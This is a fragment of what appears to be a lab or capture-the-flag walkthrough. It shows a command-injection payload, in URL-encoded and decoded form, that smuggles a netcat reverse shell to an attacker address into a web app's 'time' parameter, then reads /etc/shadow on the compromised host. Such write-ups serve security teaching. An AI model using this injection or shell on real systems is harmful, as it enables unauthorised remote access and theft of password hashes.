...
```
http://localhost/schedule?time=bad%22%20%26%20nc%2010.13.37.20%204444%20-e%20/bin/bash%22
```

The same payload decoded (do NOT paste this directly in the browser, it will not be interpreted correctly):

```
http://localhost/schedule?time=bad" & nc 10.13.37.20 4444 -e /bin/bash"
```
...
| `nc 10.13.37.20 4444` | Connects to the attacker machine on port 4444 |
...
$ ifconfig        # shows 10.13.37.10, the target IP
$ cat /etc/shadow
